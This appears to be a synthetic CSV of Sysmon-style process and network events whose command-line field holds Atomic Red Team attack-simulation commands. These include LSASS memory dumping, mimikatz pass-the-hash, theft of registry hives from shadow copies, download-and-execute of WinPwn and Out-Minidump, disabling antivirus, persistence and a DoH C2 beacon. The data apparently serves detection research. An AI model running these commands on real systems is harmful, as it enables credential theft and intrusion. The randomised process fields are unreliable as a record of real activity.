EventID,EventType,ComputerName,User,ProcessID,ProcessName,CommandLine,LogonID,LogonGuid,SourceProcessID,SourceProcessName,SourceImage,DestinationProcessID,DestinationProcessName,DestinationImage,UtcTime
7,Image Load,email-21.hendricks-allen.com,nmason,2481,taskmgr.exe,"""del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} #{replace_cab} %TEMP% /A\n"",",155768,8cac7d33-1892-4885-93c2-89640af3ae82,7359,explorer.exe,C:\Program Files\become..dll,4907,explorer.exe,C:\Users\Public\and..dll,2024-05-17T01:36:51.830522Z
1,Process Create,lt-78.evans-yu.com,michael85,6077,cmd.exe,"""rm -f #{file_to_delete}\n"",",979038,c02847eb-3668-404f-958f-a416a0c69d86,7490,taskmgr.exe,C:\Program Files\product..dll,2410,nc.exe,C:\Users\Public\structure..dll,2024-05-17T01:36:51.830522Z
1,Process Create,web-56.hebert.com,barronabigail,5827,rundll32.exe,"""reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0\nreg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe\nc:\\windows\\system32\\provlaunch.exe LOLBin\n"",",910109,65bacefe-ee6f-4096-93eb-021a450642c9,6133,cmd.exe,C:\Users\Public\turn..exe,1713,backdoor.exe,C:\Users\Public\water..exe,2024-05-17T01:36:51.831522Z
7,Image Load,db-53.griffin-sherman.com,christopher85,4546,backdoor.exe,"""$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n"",",762259,9bffe782-0b0d-410b-a981-4c7ed6350ca9,6410,taskmgr.exe,C:\Windows\close..exe,6324,taskmgr.exe,C:\Users\Public\day..exe,2024-05-17T01:36:51.831522Z
5,Process Terminate,db-02.khan.org,harringtonpamela,6186,nc.exe,"""powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct\npowershell Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct\n"",",537143,875cd4b2-f824-4d33-a1c2-6ce0267a7cc1,3031,malware.exe,C:\Windows\rest..dll,1307,malware.exe,C:\Users\Public\agency..dll,2024-05-17T01:36:51.831522Z
5,Process Terminate,email-01.hughes.com,carlsonkaren,9340,cmd.exe,"""hh.exe -decompile %temp% \""#{local_chm_file}\""\n"",",884479,0b8b4632-175a-4245-abc5-1b691e7da890,8305,explorer.exe,C:\Users\Public\adult..exe,6087,regsvr32.exe,C:\Users\Public\its..dll,2024-05-17T01:36:51.831522Z
7,Image Load,db-09.griffin.org,lrobinson,4057,regsvr32.exe,"""Remove-Item -Path (Join-Path \""$Env:SystemRoot\\prefetch\\\"" (Get-ChildItem -Path \""$Env:SystemRoot\\prefetch\\*.pf\"" -Name)[0])\n"",",421314,24ded671-885a-4502-890c-ee0bfa65cf2c,6912,taskmgr.exe,C:\Users\Public\similar..exe,3570,explorer.exe,C:\Program Files\two..exe,2024-05-17T01:36:51.831522Z
7,Image Load,db-44.davis.com,sarahlawson,8292,malware.exe,"""Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop"",",391293,92b63e9b-8aca-49fc-8558-ddf82103e288,9256,regsvr32.exe,C:\Windows\cover..dll,5698,powershell.exe,C:\Program Files\billion..dll,2024-05-17T01:36:51.831522Z
3,Network Connection,laptop-95.bates.com,zhartman,3290,powershell.exe,"""#{mimikatz_path} \""sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\""\n"",",267507,082578e3-7e16-4dd2-851b-f360e816c6f7,6651,mimikatz.exe,C:\Windows\customer..dll,5110,taskmgr.exe,C:\Users\Public\very..exe,2024-05-17T01:36:51.831522Z
1,Process Create,desktop-71.barber.com,melissanorris,3450,backdoor.exe,"""1..#{limit} | % { \n try { [System.IO.File]::Copy(\""\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\"" , \""$env:TEMP\\#{target_hive}vss$_\"", \""true\"") } catch {}\n ls \""$env:TEMP\\#{target_hive}vss$_\"" -ErrorAction Ignore\n}\n"",",545717,406cbdeb-14e9-4a75-95ae-81cc7c08eded,4545,nc.exe,C:\Users\Public\compare..dll,8310,backdoor.exe,C:\Windows\those..dll,2024-05-17T01:36:51.831522Z
11,File Create,lt-44.nicholson-hudson.com,linda02,6681,mimikatz.exe,"""cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n"",",938063,929174ef-0e84-4b40-b485-e8628bc5f271,7917,taskmgr.exe,C:\Users\Public\drop..dll,4448,rundll32.exe,C:\Windows\note..dll,2024-05-17T01:36:51.831522Z
11,File Create,srv-04.santiago.com,hendersondennis,8100,nc.exe,"""cat /etc/shells \n"",",963072,d793fae8-2754-4aba-aa72-fe59b971bdd2,9653,nc.exe,C:\Windows\within..exe,1142,cmd.exe,C:\Users\Public\election..exe,2024-05-17T01:36:51.833029Z
11,File Create,srv-45.reilly-anderson.com,adam46,1868,cmd.exe,"""wuauclt.exe /UpdateDeploymentProvider \""#{arbitrary_dll}\"" /RunHandlerComServer\n"",",627319,bf2c2677-8132-42a4-8dee-ca6a23031fb7,2007,backdoor.exe,C:\Program Files\edge..exe,4559,malware.exe,C:\Program Files\service..dll,2024-05-17T01:36:51.833029Z
7,Image Load,desktop-46.taylor.com,walterporter,2950,powershell.exe,"""ip tcp_metrics show |grep --invert-match \""^127\\.\""\n"",",670273,39267f80-e274-4a84-a3d3-d0eb59c6d364,7360,rundll32.exe,C:\Program Files\tonight..dll,9270,cmd.exe,C:\Program Files\list..exe,2024-05-17T01:36:51.833029Z
5,Process Terminate,srv-76.arnold-crawford.com,sarahbonilla,4344,malware.exe,"""mkdir $HOME/...\ncp $(which sh) $HOME/...\n$HOME/.../sh -c \""echo #{test_message}\""\n"",",159878,32ac6dab-29ed-4451-9e93-929c52c0c631,6661,regsvr32.exe,C:\Users\Public\need..dll,3039,rundll32.exe,C:\Windows\economic..dll,2024-05-17T01:36:51.833029Z
11,File Create,laptop-94.ramirez.com,carpentergeorge,4365,rundll32.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  "",",672160,84cd3232-c16e-4ccd-9c53-49069c8ebfc2,4241,explorer.exe,C:\Windows\remain..exe,8618,taskmgr.exe,C:\Windows\election..exe,2024-05-17T01:36:51.834038Z
11,File Create,email-12.paul.com,stephanieschneider,4020,mimikatz.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive"",",148755,9bf34275-4289-4e22-8479-f2b3b49d13da,8026,explorer.exe,C:\Program Files\call..dll,8009,malware.exe,C:\Windows\politics..dll,2024-05-17T01:36:51.834038Z
3,Network Connection,srv-72.sanchez-mccarthy.org,james56,7420,regsvr32.exe,"""sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod g+xs #{file_to_setuid}\n"",",980216,bfb2a49c-75ee-4507-881c-1ba7ff6487de,9264,nc.exe,C:\Program Files\American..exe,5039,explorer.exe,C:\Windows\better..exe,2024-05-17T01:36:51.834038Z
3,Network Connection,lt-63.clarke.com,leonardmathews,8006,backdoor.exe,"""cmd /c '#{netscan_path}' /hide /auto:\""$env:temp\\T1018NetscanOutput.txt\"" /range:'#{range_to_scan}'"",",673184,453b1945-4b2a-4e16-8c5a-9a600cf2df15,9467,powershell.exe,C:\Users\Public\yeah..dll,8786,regsvr32.exe,C:\Windows\explain..exe,2024-05-17T01:36:51.834038Z
7,Image Load,desktop-57.smith-hanson.net,kingrenee,1723,explorer.exe,"""pnputil.exe /add-driver \""#{driver_inf}\""\n"",",647558,d38caa03-7223-490b-b63c-d7013a285163,6823,cmd.exe,C:\Users\Public\sing..exe,9650,taskmgr.exe,C:\Program Files\base..dll,2024-05-17T01:36:51.835039Z
3,Network Connection,desktop-53.ho.net,elizabeth18,6730,malware.exe,"""aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format}\n"",",616949,e1905a01-20fd-4f79-9fbe-52afca10b8bf,4358,explorer.exe,C:\Windows\treatment..dll,9829,taskmgr.exe,C:\Program Files\up..exe,2024-05-17T01:36:51.835039Z
7,Image Load,email-16.barton.com,grossjeff,4061,nc.exe,"""bash -c 'trap \""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\"" SIGINT && kill -SIGINT $$'\n"",",683060,f1c064f7-abf5-4f70-af90-01b93ba0f0dc,3603,backdoor.exe,C:\Program Files\both..dll,2363,malware.exe,C:\Users\Public\fly..exe,2024-05-17T01:36:51.835039Z
5,Process Terminate,laptop-29.snyder.com,ple,6881,explorer.exe,"""docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ \ndocker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\ndocker exec -i t1609_container bash -c \""cat /tmp/output.txt\""\n"",",133714,9adde849-91d2-47cd-8619-f69e0be6198f,2314,taskmgr.exe,C:\Program Files\beat..exe,8356,backdoor.exe,C:\Program Files\table..exe,2024-05-17T01:36:51.835039Z
5,Process Terminate,lt-00.padilla.net,caroline03,3192,mimikatz.exe,"""\""#{exe_binary}\""\n"",",179742,a5b88235-7862-434c-9873-b9a98e133a72,3446,rundll32.exe,C:\Users\Public\wife..exe,8971,taskmgr.exe,C:\Users\Public\so..dll,2024-05-17T01:36:51.835039Z
11,File Create,desktop-77.meadows.com,washingtondanielle,1673,powershell.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \""PathToAtomicsFolder\\..\\ExternalPayloads\\\"" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump\n"",",216559,4fbc3b85-2eb9-4740-a49a-2ba973f12240,3835,malware.exe,C:\Windows\young..exe,8933,nc.exe,C:\Windows\director..exe,2024-05-17T01:36:51.836035Z
11,File Create,lt-05.hubbard.com,cjackson,4185,powershell.exe,"""sudo mdatp config real-time-protection --value disabled\n"",",801259,a7362633-1480-4db4-8454-7fc14134f3d8,8016,explorer.exe,C:\Users\Public\condition..dll,7700,cmd.exe,C:\Program Files\certainly..exe,2024-05-17T01:36:51.836035Z
1,Process Create,db-72.shepherd.info,nmorris,9101,cmd.exe,"""IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n"",",665092,b7708769-082e-4590-8b87-810516e910d8,2238,powershell.exe,C:\Windows\usually..exe,2568,mimikatz.exe,C:\Program Files\parent..exe,2024-05-17T01:36:51.836035Z
5,Process Terminate,srv-19.lewis.org,avillanueva,5116,powershell.exe,"""ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'\n"",",688923,a2eaaf76-b991-47d3-bc92-f2f922d2921b,6469,regsvr32.exe,C:\Program Files\opportunity..dll,2683,taskmgr.exe,C:\Program Files\return..exe,2024-05-17T01:36:51.836035Z
3,Network Connection,srv-71.cordova.org,terri29,7395,regsvr32.exe,"""docker build -t t1610 $PathtoAtomicsFolder/T1610/src/\ndocker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh\n"",",616736,f3a52fc8-98c1-4432-80ed-48a800620187,6235,backdoor.exe,C:\Windows\green..exe,5617,nc.exe,C:\Windows\myself..exe,2024-05-17T01:36:51.836035Z
7,Image Load,db-84.castillo.biz,jessicaolson,7620,malware.exe,"""Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}"",",356859,ef618855-79d7-42a3-8ef1-a95c5cf2af3c,8970,cmd.exe,C:\Program Files\time..dll,4210,nc.exe,C:\Program Files\operation..dll,2024-05-17T01:36:51.836035Z
7,Image Load,laptop-84.smith.org,crichardson,2656,powershell.exe,"""Copy-Item \""$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\"" \""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\""\nCopy-Item \""$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\"" \""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\""\nStart-Process \""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\""\nStart-Process \""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\""\n"",",832389,3d3d40d1-331c-486e-beaf-f9d58b079e52,4479,regsvr32.exe,C:\Program Files\second..dll,3954,nc.exe,C:\Windows\threat..dll,2024-05-17T01:36:51.836035Z
3,Network Connection,email-50.wise.com,daniel99,7421,powershell.exe,"""bash -c 'trap \""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\"" EXIT'\n"",",890070,328cd882-95d6-444b-b77d-d34d80b831c5,9213,regsvr32.exe,C:\Program Files\level..exe,8950,malware.exe,C:\Program Files\actually..exe,2024-05-17T01:36:51.837036Z
1,Process Create,srv-04.mitchell-smith.com,phillipsgabriel,4576,taskmgr.exe,"""rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \""#{inf_to_execute}\""\n"",",365686,0aa2c83d-4e86-4073-bb19-b64da6ef6fc4,9314,cmd.exe,C:\Windows\knowledge..exe,9060,malware.exe,C:\Program Files\nothing..exe,2024-05-17T01:36:51.837036Z
7,Image Load,email-65.murphy-hunter.com,inavarro,1916,malware.exe,"""which_python=`which python || which python3`\n$which_python -c \""import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();\""\n"",",143234,e919532c-c2a4-4423-a356-b09e367b0560,7274,mimikatz.exe,C:\Program Files\represent..exe,4274,nc.exe,C:\Windows\keep..exe,2024-05-17T01:36:51.837036Z
1,Process Create,web-48.delgado.biz,cainzachary,9344,powershell.exe,"""docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/\ndocker run --name t1069_container  -d -t t1069\ndocker exec t1069_container ./test.sh"",",832125,5d9fd242-6a3c-46a1-b63e-27884ad0e8d5,4384,powershell.exe,C:\Windows\nothing..exe,7538,malware.exe,C:\Windows\laugh..dll,2024-05-17T01:36:51.837036Z
7,Image Load,srv-78.cabrera.com,yhernandez,9667,backdoor.exe,"""dsenableroot #current user\ndsenableroot -u art-tester -p art-tester -r art-root #new user"",",774566,ab568c68-1ff3-4759-a8c8-8b8ba6ab94f1,9158,malware.exe,C:\Program Files\lead..exe,5094,rundll32.exe,C:\Users\Public\high..dll,2024-05-17T01:36:51.837036Z
5,Process Terminate,lt-13.webb-young.com,michelle87,8932,mimikatz.exe,"""C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \""#{dll_payload}\""\n"",",236900,900db472-5f1d-4c11-bbfa-4fb113e4d8a3,1618,nc.exe,C:\Users\Public\real..dll,1105,explorer.exe,C:\Program Files\today..exe,2024-05-17T01:36:51.838034Z
7,Image Load,desktop-41.garcia.com,sawyerjohn,6672,backdoor.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nDotnetsearch -noninteractive -consoleoutput"",",133544,6f8aef99-4e9a-4eec-a728-a38f1dd45728,1437,regsvr32.exe,C:\Program Files\identify..dll,1073,cmd.exe,C:\Program Files\improve..exe,2024-05-17T01:36:51.838034Z
11,File Create,db-92.perez-richard.com,alyssawilliams,6113,rundll32.exe,"""copy-item -Path \""\\\\#{remote}\\C$\\#{share_file}\"" -Destination \""$Env:TEMP\\#{local_file}\"""",",347135,0ac50a36-c0a3-41f8-a1c0-f17310429cdf,6355,malware.exe,C:\Windows\here..exe,3912,rundll32.exe,C:\Program Files\stage..exe,2024-05-17T01:36:51.838034Z
1,Process Create,web-58.white-chang.com,berryrichard,7139,taskmgr.exe,"""reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n"",",825293,3c9dae97-c058-4efd-85a8-c90b07665824,2766,malware.exe,C:\Program Files\expert..exe,2950,powershell.exe,C:\Program Files\day..exe,2024-05-17T01:36:51.838034Z
3,Network Connection,srv-30.garcia.com,ysmith,3285,mimikatz.exe,"""# Set the remote computer name and credentials\n $RemoteComputer = \""#{dest}\""\n $PWord = ConvertTo-SecureString -String \""#{password}\"" -AsPlainText -Force\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""#{username}\"", $Pword\n\n # Create a CIM session\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\n\n # Define the process you want to start\n $ProcessToStart = \""#{process}\""\n\n # Invoke the Create method on the Win32_Process class to start the process\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\n\n # Check the result\n if ($Result.ReturnValue -eq 0) {\n     Write-Host \""Process started successfully with Process ID: $($Result.ProcessId)\""\n } else {\n     Write-Host \""Failed to start the process. Error code: $($Result.ReturnValue)\""\n }\n\n # Clean up the CIM session\n Remove-CimSession -CimSession $CimSession \n"",",520094,8a917df5-9cb1-42d5-a181-84194d6d98b1,7747,malware.exe,C:\Users\Public\heavy..dll,6411,nc.exe,C:\Users\Public\edge..exe,2024-05-17T01:36:51.839035Z
5,Process Terminate,srv-33.garza.info,lesliefernandez,3131,cmd.exe,"""Set-Location \""PathToAtomicsFolder\""\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n"",",901390,5abe9257-5741-4fff-9571-ce1a6b953130,9420,regsvr32.exe,C:\Windows\line..dll,2846,nc.exe,C:\Program Files\here..dll,2024-05-17T01:36:51.839035Z
11,File Create,web-72.gardner-wiggins.biz,stevemartinez,6084,mimikatz.exe,"""docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ \ndocker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\ndocker exec -i t1609_container bash -c \""cat /tmp/output.txt\""\n"",",718000,cf3c8bba-8090-46a2-a35e-5aa32f41441b,6948,mimikatz.exe,C:\Windows\would..dll,3325,rundll32.exe,C:\Users\Public\role..exe,2024-05-17T01:36:51.839035Z
5,Process Terminate,desktop-19.moore-vega.net,savagemark,1191,taskmgr.exe,"""$PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \""#{spawn_process_path}\"" -debug\n"",",894201,78cc212d-b4fe-45cc-9db4-da4240db3f35,2729,malware.exe,C:\Program Files\threat..dll,5646,backdoor.exe,C:\Program Files\through..dll,2024-05-17T01:36:51.839035Z
11,File Create,laptop-45.callahan.info,bjones,3535,regsvr32.exe,"""InfDefaultInstall.exe \""#{inf_to_execute}\""\n"",",387220,3e72f565-6eeb-420b-b5d9-3c8f240238dd,3280,cmd.exe,C:\Windows\company..dll,7546,cmd.exe,C:\Windows\our..exe,2024-05-17T01:36:51.839035Z
1,Process Create,email-67.brennan-morrison.com,fbates,1460,backdoor.exe,"""copy \""#{filename}\"" %TEMP%\\hello.js\n#{jscpath}\\#{jscname} %TEMP%\\hello.js\n"",",991470,76514042-6f7a-41e3-9ce5-10710e22492d,7213,cmd.exe,C:\Program Files\require..dll,6567,regsvr32.exe,C:\Program Files\building..dll,2024-05-17T01:36:51.840036Z
7,Image Load,laptop-22.tucker.org,brianchung,7774,nc.exe,"""xattr -lr * / 2>&1 /dev/null | grep -C 2 \""00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\""\n"",",756583,758308df-ad8d-4255-8760-9e14b379fb26,4025,mimikatz.exe,C:\Program Files\group..dll,7574,mimikatz.exe,C:\Program Files\father..dll,2024-05-17T01:36:51.840036Z
11,File Create,srv-21.smith.com,derrick69,7551,explorer.exe,"""certutil -addstore my #{pfx_path}\n"",",169478,c7616530-f925-4f4f-8191-918bd24bb364,9216,powershell.exe,C:\Users\Public\ok..exe,2228,regsvr32.exe,C:\Users\Public\role..exe,2024-05-17T01:36:51.840036Z
3,Network Connection,laptop-36.hall.biz,bcase,4488,explorer.exe,"""reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language\n"",",383414,5246d49c-2daa-405f-a8b9-c6b0fa41ce6f,7885,backdoor.exe,C:\Users\Public\collection..dll,8316,taskmgr.exe,C:\Program Files\only..dll,2024-05-17T01:36:51.840036Z
11,File Create,srv-02.ho.com,eaustin,4207,malware.exe,"""dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n"",",173164,459e885e-e455-4b2c-bb37-4b8551feb8ba,4941,mimikatz.exe,C:\Windows\world..exe,1906,mimikatz.exe,C:\Windows\already..dll,2024-05-17T01:36:51.840036Z
7,Image Load,web-56.rodriguez-james.com,ashley47,4628,mimikatz.exe,"""$credFile = \""#{cred_file}\""\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \""#{new_password}\""){\n      Write-Host -ForegroundColor Yellow \""The new password is the same as the password stored in the credential file. Please specify a different new password.\""; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \""Error code: $errCode\""\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\""\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \""Successfully changed the password to #{new_password}\""\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \""#{new_password}\"" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \""You must store the password of the current user by running the prerequisite commands first\""\n}\n"",",792118,c7b0682b-3378-4c0b-91b9-332f5f4017f1,2535,mimikatz.exe,C:\Users\Public\consider..exe,3246,nc.exe,C:\Program Files\tree..dll,2024-05-17T01:36:51.841035Z
